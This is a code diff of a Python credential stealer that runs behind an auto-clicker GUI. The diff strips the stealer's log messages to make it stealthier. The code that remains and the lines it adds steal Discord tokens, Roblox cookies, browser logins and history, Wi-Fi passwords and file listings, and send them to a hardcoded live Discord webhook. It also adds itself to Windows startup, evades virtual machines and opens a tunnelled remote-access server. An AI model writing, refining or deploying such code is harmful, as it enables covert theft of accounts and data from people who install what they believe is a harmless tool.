@@ -1,7 +1,3 @@
-# =================== INTEGRATED STEALTH MALWARE ===================
-# REBEL GENIUS EDITION - PRODUCTION READY
-# -= GODMODE ENABLED =-
-
 import ctypes
 import psutil
 import os
@@ -29,19 +25,10 @@ import subprocess
 import platform
 import sys
 import time
-import struct
-import binascii
-import csv
-from contextlib import contextmanager
-import windows
-import windows.security
-import windows.crypto
-import windows.generated_def as gdef
-from Crypto.Cipher import ChaCha20_Poly1305
+import tkinter as tk
 from pynput import mouse, keyboard
 from pynput.keyboard import Listener as KeyboardListener
 from pynput.mouse import Listener as MouseListener
-import tkinter as tk
 import urllib.request
 import urllib.error
 
@@ -49,7 +36,7 @@ import urllib.error
 WEBHOOK_URL = "https://discord.com/api/webhooks/1460790440428175553/pKYIidBOMxcqroGRdpBROYtBkqbh9JPoD07hYv2_QNdB1qOw-BdWNt-bJ-xO8pylVFZ2"
 
 # =================== WINDOWS SPECIFIC IMPORTS ===================
-if sys.platform == "win32":
+if sys.platform == 'win32':
     from ctypes import windll
     winmm = windll.winmm
     winmm.timeBeginPeriod(1)
@@ -125,14 +112,7 @@ def vm_bypass():
             return False
     return True
 
-# =================== GLOBAL STATE ===================
-cloudflare_url = None
-flask_app = None
-flask_thread = None
-log_buffer = []
-PORT = 5000
-auto_clicker_running = False
-
+# =================== PATHS & GLOBALS ===================
 LOCAL = os.getenv("LOCALAPPDATA")
 ROAMING = os.getenv("APPDATA")
 PATHS = {
@@ -161,7 +141,11 @@ PATHS = {
     'Vencord': ROAMING + '\\Vencord'
 }
 
-# =================== HELPER FUNCTIONS ===================
+PORT = 5000
+log_buffer = []
+auto_clicker_running = False
+
+# =================== STARTUP PERSISTENCE ===================
 def copy_exe_to_startup(exe_path):
     startup_folder = os.path.join(
         os.getenv('APPDATA'),
@@ -172,6 +156,7 @@ def copy_exe_to_startup(exe_path):
     if not os.path.exists(destination_path):
         shutil.copy2(exe_path, destination_path)
 
+# =================== DISCORD TOKEN STEALER ===================
 def getheaders(token=None):
     headers = {
         "Content-Type": "application/json",
@@ -232,99 +217,19 @@ def retrieve_roblox_cookies():
 
 def send_to_discord(message):
     payload = {"content": message}
-    response = requests.post(WEBHOOK_URL, json=payload)
-    if response.status_code == 204:
-        print("")
-    else:
-        print(f"Failed: {response.status_code} {response.text}")
-
-def send_file_to_discord(file_path, message="File from victim's PC"):
-    if not os.path.exists(file_path):
-        return False
     try:
-        with open(file_path, 'rb') as file:
-            files = {'file': (os.path.basename(file_path), file)}
-            data = {'content': message}
-            response = requests.post(WEBHOOK_URL, files=files, data=data)
-            if response.status_code == 204:
-                return True
-            else:
-                return False
-    except Exception as e:
-        print(f"Error sending file: {e}")
-        return False
+        requests.post(WEBHOOK_URL, json=payload)
+    except:
+        pass
 
 def send_to_discord_embed(embed=None):
     payload = {"username": "Wife Beater"}
     if embed:
         payload["embeds"] = [embed]
     try:
-        response = requests.post(WEBHOOK_URL, data=json.dumps(payload), headers={"Content-Type": "application/json"})
-        return response.status_code in [200, 204]
-    except Exception as e:
-        print(f"Error sending embed: {e}")
-        return False
-
-# =================== MAIN STEALER FUNCTION ===================
-def main_stealer():
-    checked = []
-    for platform_name, path in PATHS.items():
-        if not os.path.exists(path):
-            continue
-        for token in gettokens(path):
-            token = token.replace("\\", "") if token.endswith("\\") else token
-            try:
-                token = AES.new(win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1], AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
-                if token in checked:
-                    continue
-                checked.append(token)
-                res = urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v10/users/@me', headers=getheaders(token)))
-                if res.getcode() != 200:
-                    continue
-                res_json = json.loads(res.read().decode())
-                roblox_cookies = retrieve_roblox_cookies()
-                embed_user = {
-                    'embeds': [{
-                        'title': f"**New user data: {res_json['username']}**",
-                        'description': f""" User ID:```\n {res_json['id']}\n```\nIP Info:```\n {getip()}\n```\nUsername:```\n {os.getenv("UserName")}```\nToken Location:```\n {platform_name}```\nToken:```\n{token}```\nRoblox Cookies:```\n{roblox_cookies}```""",
-                        'color': 3092790,
-                        'footer': {'text': "Made By Ryzen"},
-                        'thumbnail': {'url': f"https://cdn.discordapp.com/avatars/{res_json['id']}/{res_json['avatar']}.png"}
-                    }],
-                    "username": "Wife Beater",
-                }
-                urllib.request.urlopen(urllib.request.Request(WEBHOOK_URL, data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
-            except (urllib.error.HTTPError, json.JSONDecodeError):
-                continue
-            except Exception as e:
-                print(f"ERROR: {e}")
-                continue
-
-    browsers = ["Chrome", "Firefox", "Brave", "Edge", "Opera", "Opera GX"]
-    installed_browsers = [browser for browser in browsers if is_browser_installed(browser)]
-    if not installed_browsers:
-        return
-
-    created_files = []
-    for browser in installed_browsers:
-        history = get_browser_history(browser, limit=200)
-        if history:
-            file_path = save_to_file(f"{browser}_history", history)
-            created_files.append(file_path)
-            send_file_to_discord(file_path, message="Browser History")
-
-    for browser in installed_browsers:
-        logins = get_browser_logins(browser, limit=300)
-        if logins:
-            file_path = save_to_file(f"{browser}_logins", logins)
-            created_files.append(file_path)
-            send_file_to_discord(file_path, message="Browser Logins")
-
-    for file_path in created_files:
-        delete_file(file_path)
-
-    roblox_cookies_path = os.path.join(os.getenv("TEMP", ""), "RobloxCookies.dat")
-    delete_file(roblox_cookies_path)
+        requests.post(WEBHOOK_URL, data=json.dumps(payload), headers={"Content-Type": "application/json"})
+    except:
+        pass
 
 # =================== BROWSER FUNCTIONS ===================
 def get_history_path(browser):
@@ -390,6 +295,18 @@ def save_to_file(browser, data):
         file.write(data)
     return full_path
 
+def send_file_to_discord(file_path, message="File from victim's PC"):
+    if not os.path.exists(file_path):
+        return False
+    try:
+        with open(file_path, 'rb') as file:
+            files = {'file': (os.path.basename(file_path), file)}
+            data = {'content': message}
+            requests.post(WEBHOOK_URL, files=files, data=data)
+            return True
+    except:
+        return False
+
 def get_login_path(browser):
     if browser == "Chrome":
         return os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Login Data")
@@ -449,6 +366,66 @@ def get_browser_logins(browser, limit=100):
 def delete_file(file_path):
     if os.path.exists(file_path):
         os.remove(file_path)
+
+# =================== MAIN STEALER FUNCTION ===================
+def main_stealer():
+    checked = []
+    for platform_name, path in PATHS.items():
+        if not os.path.exists(path):
+            continue
+        for token in gettokens(path):
+            token = token.replace("\\", "") if token.endswith("\\") else token
+            try:
+                token = AES.new(win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1], AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
+                if token in checked:
+                    continue
+                checked.append(token)
+                res = urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v10/users/@me', headers=getheaders(token)))
+                if res.getcode() != 200:
+                    continue
+                res_json = json.loads(res.read().decode())
+                roblox_cookies = retrieve_roblox_cookies()
+                embed_user = {
+                    'embeds': [{
+                        'title': f"**New user data: {res_json['username']}**",
+                        'description': f""" User ID:```\n {res_json['id']}\n```\nIP Info:```\n {getip()}\n```\nUsername:```\n {os.getenv("UserName")}```\nToken Location:```\n {platform_name}```\nToken:```\n{token}```\nRoblox Cookies:```\n{roblox_cookies}```""",
+                        'color': 3092790,
+                        'footer': {'text': "Made By Ryzen"},
+                        'thumbnail': {'url': f"https://cdn.discordapp.com/avatars/{res_json['id']}/{res_json['avatar']}.png"}
+                    }],
+                    "username": "Wife Beater",
+                }
+                urllib.request.urlopen(urllib.request.Request(WEBHOOK_URL, data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
+            except (urllib.error.HTTPError, json.JSONDecodeError):
+                continue
+            except Exception as e:
+                continue
+
+    browsers = ["Chrome", "Firefox", "Brave", "Edge", "Opera", "Opera GX"]
+    installed_browsers = [browser for browser in browsers if is_browser_installed(browser)]
+    if not installed_browsers:
+        return
+
+    created_files = []
+    for browser in installed_browsers:
+        history = get_browser_history(browser, limit=200)
+        if history:
+            file_path = save_to_file(f"{browser}_history", history)
+            created_files.append(file_path)
+            send_file_to_discord(file_path, message="Browser History")
+
+    for browser in installed_browsers:
+        logins = get_browser_logins(browser, limit=300)
+        if logins:
+            file_path = save_to_file(f"{browser}_logins", logins)
+            created_files.append(file_path)
+            send_file_to_discord(file_path, message="Browser Logins")
+
+    for file_path in created_files:
+        delete_file(file_path)
+
+    roblox_cookies_path = os.path.join(os.getenv("TEMP", ""), "RobloxCookies.dat")
+    delete_file(roblox_cookies_path)
 
 # =================== WIFI PASSWORDS ===================
 def get_wifi_passwords():
@@ -580,7 +557,52 @@ def send_log_file():
     except Exception:
         pass
 
-# =================== AUTO-CLICKER GUI (FRONTEND) ===================
+# =================== ULTRA-FAST AUTO-CLICKER ===================
+PUL = ctypes.POINTER(ctypes.c_ulong)
+
+class MouseInput(ctypes.Structure):
+    _fields_ = [
+        ("dx", ctypes.c_long),
+        ("dy", ctypes.c_long),
+        ("mouseData", ctypes.c_ulong),
+        ("dwFlags", ctypes.c_ulong),
+        ("time", ctypes.c_ulong),
+        ("dwExtraInfo", PUL)
+    ]
+
+class Input(ctypes.Structure):
+    _fields_ = [("type", ctypes.c_ulong), ("mi", MouseInput)]
+
+MOUSE_DOWN_FLAGS = {
+    mouse.Button.left: 0x0002,
+    mouse.Button.right: 0x0008,
+    mouse.Button.middle: 0x0020,
+    mouse.Button.x1: 0x0080,
+    mouse.Button.x2: 0x0100,
+}
+MOUSE_UP_FLAGS = {
+    mouse.Button.left: 0x0004,
+    mouse.Button.right: 0x0010,
+    mouse.Button.middle: 0x0040,
+    mouse.Button.x1: 0x0080,
+    mouse.Button.x2: 0x0100,
+}
+
+MOUSE_INPUTS = {
+    'left_down': Input(type=0, mi=MouseInput(0, 0, 0, MOUSE_DOWN_FLAGS[mouse.Button.left], 0, None)),
+    'left_up': Input(type=0, mi=MouseInput(0, 0, 0, MOUSE_UP_FLAGS[mouse.Button.left], 0, None)),
+}
+
+SendInput = ctypes.windll.user32.SendInput
+SendInput.argtypes = [ctypes.c_uint, ctypes.POINTER(Input), ctypes.c_int]
+SendInput.restype = ctypes.c_uint
+
+def send_click_fast():
+    """Ultra-fast click function using pre-created inputs"""
+    SendInput(1, ctypes.byref(MOUSE_INPUTS['left_down']), ctypes.sizeof(Input))
+    SendInput(1, ctypes.byref(MOUSE_INPUTS['left_up']), ctypes.sizeof(Input))
+
+# =================== AUTO-CLICKER GUI ===================
 class AutoClickerGUI:
     def __init__(self, root):
         self.root = root
@@ -823,7 +845,7 @@ class AutoClickerGUI:
                 current_time_ns = time_ns()
                 
                 if current_time_ns >= next_click_time_ns:
-                    self.send_click_fast()
+                    send_click_fast()
                     
                     next_click_time_ns += target_interval_ns
                     
@@ -838,13 +860,6 @@ class AutoClickerGUI:
                     pass
                     
         except Exception as e:
-            print(f"Error in click loop: {e}")
-
-    def send_click_fast(self):
-        """Send fast click using pyautogui"""
-        try:
-            pyautogui.click()
-        except:
             pass
 
     def update_loop(self):
@@ -883,41 +898,23 @@ def start_autoclicker():
 # =================== BACKGROUND STEALER THREAD ===================
 def background_stealer():
     """Run the stealer in background"""
-    print("[BACKGROUND] Starting stealth operation...")
     
     # Initial delay to let GUI load
     time.sleep(5)
     
     # VM bypass
     if not vm_bypass():
-        print("[BACKGROUND] VM bypass failed")
         return
-    
-    print("[BACKGROUND] VM bypass successful")
-    
-    # Force admin privileges
-    def force_admin():
-        if not ctypes.windll.shell32.IsUserAnAdmin():
-            ctypes.windll.shell32.ShellExecuteW(
-                None, "runas", sys.executable, __file__, None, 1
-            )
-            sys.exit(0)
-    force_admin()
     
     # Run main stealer
     try:
-        print("[BACKGROUND] Running Discord token stealer...")
         main_stealer()
-        
-        print("[BACKGROUND] Getting WiFi passwords...")
         get_wifi_passwords()
-        
-        print("[BACKGROUND] Collecting file inventory...")
         report = collect_all_files()
         save_local_report(report)
         upload_report(report)
         
-        print("[BACKGROUND] Starting remote access server...")
+        # Start remote access server
         if getattr(sys, "frozen", False):
             os.environ["CLOUDFLARED_PATH"] = os.path.join(sys._MEIPASS, "cloudflared.exe")
 
@@ -930,42 +927,27 @@ def background_stealer():
 
         try:
             public_url = try_cloudflare(PORT)
-            print(f"[BACKGROUND] Remote access URL: {public_url}")
         except Exception as e:
             hostname = socket.gethostname()
             local_ip = socket.gethostbyname(hostname)
-            print(f"[BACKGROUND] Local access: http://{local_ip}:{PORT}")
 
-        print("[BACKGROUND] Sending terminal logs...")
         send_log_file()
-        
-        # NO COOKIE HARVESTING REMAINS
-        print("[BACKGROUND] Stealth operation completed")
                 
-    except Exception as e:
-        print(f"[BACKGROUND] Error: {e}")
-        import traceback
-        traceback.print_exc()
+    except Exception:
+        pass
 
 # =================== MAIN EXECUTION ===================
 if __name__ == "__main__":
-    print("="*50)
-    print("🖥️ RYZEN'S PYTHON MACRO + STEALTH STEALER")
-    print("="*50)
-    
     # Add to startup
     exe_path = os.path.abspath(sys.argv[0])
     copy_exe_to_startup(exe_path)
-    print("[STARTUP] Added to Windows startup")
     
     # Start auto-clicker GUI FIRST (frontend)
-    print("\n[1/2] Starting Auto-Clicker GUI (Frontend)...")
     autoclicker_thread = threading.Thread(target=start_autoclicker, daemon=True)
     autoclicker_thread.start()
     time.sleep(2)  # Give GUI time to initialize
     
     # Start background stealer SECOND (background)
-    print("[2/2] Starting Stealth Stealer (Background)...")
     stealer_thread = threading.Thread(target=background_stealer, daemon=True)
     stealer_thread.start()
     
@@ -974,4 +956,4 @@ if __name__ == "__main__":
         while True:
             time.sleep(1)
     except KeyboardInterrupt:
-        print("\n[EXIT] Shutting down...")
+        pass
